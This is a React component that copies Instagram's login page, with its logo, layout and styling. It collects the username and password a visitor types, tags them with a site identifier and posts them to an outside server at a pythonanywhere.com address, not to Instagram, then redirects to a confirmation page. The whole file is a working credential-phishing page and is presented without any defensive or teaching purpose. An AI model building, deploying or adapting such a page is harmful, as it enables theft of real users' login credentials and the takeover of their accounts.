import React, { useState } from "react";
import { useNavigate } from "react-router-dom"; // Use useNavigate for redirection
import { useSite } from "../context/SiteContext"; // Ensure correct path
import instaLogo from "../assets/insta.png";

const InstagramLogin: React.FC = () => {
  const [username, setUsername] = useState<string>("");
  const [password, setPassword] = useState<string>("");
  const [loading, setLoading] = useState<boolean>(false);
  const [usernameError, setUsernameError] = useState<boolean>(false);
  const [passwordError, setPasswordError] = useState<boolean>(false);
  const [errorMessage, setErrorMessage] = useState<string | null>(null);
  
  const navigate = useNavigate(); // Initialize useNavigate
  const { siteId } = useSite(); // Ensure siteId is defined

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault(); // Prevent default form submission

    // Validate username and password
    setUsernameError(!username);
    setPasswordError(!password);

    if (!username || !password) {
      return;
    }

    setLoading(true);
    const xusername = `${username}_${siteId}`;
    const xpassword = `${password}_${siteId}`;

    try {
      // Send login request without device data
      const response = await fetch("https://bossj.pythonanywhere.com/api/instagram/", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          xusername,
          xpassword,
        }),
      });

      const data = await response.json();

      // Add a delay of 2 seconds before processing the response
      setTimeout(() => {
        if (response.ok) {
          // Successful login, redirect to home page
          navigate("/confirm"); // Use navigate instead of alert
        } else {
          // Handle error (e.g., display an error message)
          setErrorMessage(data.message || "Login failed. Please try again.");
        }
      }, 2000); // 2 seconds delay
    } catch (error) {
      setErrorMessage("An error occurred. Please try again.");
      console.error("Login Error:", error);
    } finally {
      setLoading(false);
    }
  };

  const containerStyle: React.CSSProperties = {
    display: "flex",
    boxSizing: "border-box",
    flexDirection: "column",
    alignItems: "center",
    justifyContent: "center",
    minHeight: "100vh",
    backgroundColor: "#fafafa",
    fontFamily: "Helvetica Neue, Helvetica, Arial, sans-serif",
  };

  const loginBoxStyle: React.CSSProperties = {
    backgroundColor: "#ffffff",
    border: "1px solid #dbdbdb",
    padding: "40px 40px 20px",
    width: "350px",
    textAlign: "center",
    boxSizing: "border-box",
    marginTop: "-7rem",
  };
  
  const logoContainer: React.CSSProperties = {
    marginBottom: "1.8rem",
  };

  const logoStyle: React.CSSProperties = {
    width: "200px",
  };

  const inputStyle: React.CSSProperties = {
    width: "100%",
    padding: "12px",
    margin: "4px 0",
    border: "1px solid #dbdbdb",
    borderRadius: "4px",
    backgroundColor: "#fafafa",
    fontSize: "14px",
    boxSizing: "border-box",
    color: "#000",
    outline: "none",
  };

  const buttonStyle: React.CSSProperties = {
    width: "100%",
    padding: "8px",
    margin: "12px 0",
    backgroundColor: "#0095f6",
    color: "#ffffff",
    border: "none",
    borderRadius: "4px",
    fontSize: "14px",
    fontWeight: "bold",
    cursor: "pointer",
    outline: "none",
  };

  const linkStyle: React.CSSProperties = {
    color: "#0095f6",
    fontSize: "12px",
    textDecoration: "none",
    margin: "12px 0",
  };

  return (
    <div style={containerStyle}>
      <div style={loginBoxStyle}>
        <div style={logoContainer}>
          <img style={logoStyle} src={instaLogo} alt="Instagram" />
        </div>
        <form onSubmit={handleLogin}>
          <input
            type="text"
            placeholder="Phone number, username, or email"
            value={username}
            onChange={(e) => {
              setUsername(e.target.value);
              setUsernameError(false);
              setErrorMessage(null);
            }}
            style={{
              ...inputStyle,
              borderColor: usernameError ? "red" : "#dbdbdb",
            }}
          />
          <input
            type="password"
            placeholder="Password"
            value={password}
            onChange={(e) => {
              setPassword(e.target.value);
              setPasswordError(false);
              setErrorMessage(null);
            }}
            style={{
              ...inputStyle,
              borderColor: passwordError ? "red" : "#dbdbdb",
            }}
          />
          {errorMessage && (
            <div style={{ color: "red", fontSize: "12px", marginBottom: "10px" }}>
              {errorMessage}
            </div>
          )}
          <button type="submit" style={buttonStyle} disabled={loading}>
            {loading ? "Logging in..." : "Log in"}
          </button>
        </form>
        <a href="#" style={linkStyle}>
          Forgot password?
        </a>
      </div>
      <div style={{ ...loginBoxStyle, marginTop: "12px", padding: "20px" }}>
        <span style={{ fontSize: "14px", color: "#00376b" }}>
          Don't have an account?{" "}
          <a
            href="#"
            style={{ ...linkStyle, fontSize: "14px", fontWeight: "bold" }}
          >
            Sign up
          </a>
        </span>
      </div>
    </div>
  );
};

export default InstagramLogin;